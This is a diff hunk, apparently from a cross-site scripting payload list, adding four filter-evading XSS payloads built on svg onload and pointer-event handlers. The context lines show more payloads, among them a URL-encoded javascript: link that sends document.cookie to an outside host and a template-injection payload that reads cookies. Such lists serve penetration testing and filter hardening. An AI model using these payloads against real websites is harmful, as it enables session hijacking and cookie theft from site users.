@@ -218,3 +218,7 @@ javascript%3Alocation%2f**%2f=%27https://external.com/?%27%2bdocument.cookie
 <!--><svg+onload=%27top[%2fal%2f%2esource%2b%2fert%2f%2esource](origin)%27>
 </h1>%3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E
 {{$emit.constructor\alert(document.cookie)`()}}`
+<svg onload="a=domain,b=confirm,c=window,c.onerror=b;throw a">
+<svg id=javascript:alert(1) onload=location=id>
+<0 name="<svg/onload=alert()>">
+<cool/onpointermove=(confirm)(1)>MoveMouseHere
